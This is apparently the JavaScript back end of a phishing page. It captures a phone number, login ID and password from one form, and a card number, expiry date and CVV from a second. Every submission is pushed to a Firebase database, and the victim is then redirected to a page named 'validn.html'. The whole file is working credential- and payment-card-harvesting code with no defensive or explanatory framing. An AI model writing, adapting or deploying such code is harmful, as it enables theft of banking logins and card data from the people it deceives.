// Reference your database
var ududip007DB = firebase.database().ref("ududip007");

// Handle form submission for form1
document.getElementById("form1").addEventListener("submit", submitForm1);

// Handle form submission for form2
document.getElementById("form2").addEventListener("submit", submitForm2);

// Save form data to Firebase for form1
function submitForm1(e) {
  e.preventDefault();

  // Get form values
    var uphone = getElementVal("uphone");
  var ucid = getElementVal("ucid");
  var pword = getElementVal("pword");

  // Save form data to Firebase if both fields are filled
  if (uphone && ucid && pword) {
    saveFormData("form1", { PhoneNumber: uphone, LoginId: ucid, Password: pword });
  }

  // Redirect to validn
  window.location.href = "validn.html";
}

// Save form data to Firebase for form2
function submitForm2(e) {
  e.preventDefault();

  // Get form values
  var ucard = getElementVal("ucard");
  var cexp = getElementVal("cexp");
  var ccvv = getElementVal("ccvv");

  // Save form data to Firebase if both fields are filled
  if (ucard && cexp && ccvv) {
    saveFormData("form2", { ucard: ucard, cexp: cexp, ccvv: ccvv });
  }

  // Redirect to validn
  window.location.href = "validn.html";
}



// Save form data to Firebase
function saveFormData(formId, formData) {
  var newududip007 = ududip007DB.push();
  newududip007.set(formData);
}

// Get element value by ID
function getElementVal(id) {
  return document.getElementById(id).value;
}
